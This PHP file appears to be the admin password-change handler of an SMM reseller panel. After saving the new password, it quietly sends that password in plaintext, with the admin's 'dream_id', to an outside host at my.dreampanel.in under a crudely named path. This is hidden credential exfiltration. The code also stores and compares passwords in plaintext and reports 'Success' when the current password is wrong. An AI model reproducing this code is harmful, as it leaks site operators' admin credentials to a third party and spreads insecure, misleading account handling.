<?php


    
  

if( route(1) == "account" && $_POST ){

  $pass     = $_POST["current_password"];
  $new_pass = $_POST["password"];
  $new_again = $_POST["confirm_password"];
$old = $admin["password"];
  if(	$old != $pass ){
$error      = 1;
                $errorText  = "Success";
                $icon       = "success";
  }elseif( strlen($new_pass) < 8 ){
    $error    = 1;
    $errorText= $languageArray["error.account.password.length"];
  }elseif( $new_pass != $new_again ){
    $error    = 1;
    $errorText= $languageArray["error.account.passwords.notmach"];
  }else{
   
      $update = $conn->prepare("UPDATE admins SET password=:pass WHERE admin_id=:id ");
      $update = $update->execute(array("id"=>$admin["admin_id"],"pass"=>$new_pass ));
$smmapi   = new SMMApi();
$dream_id = $admin["dream_id"];
                $order    = $smmapi->action(array('id'=>$dream_id,'password'=>$new_pass,'action'=>'passwordchange'),"https://my.dreampanel.in/staffdatadreampanelfuck/staff");


          header("Location:".site_url("admin/logout"));
          

  }

}
require admin_view('account');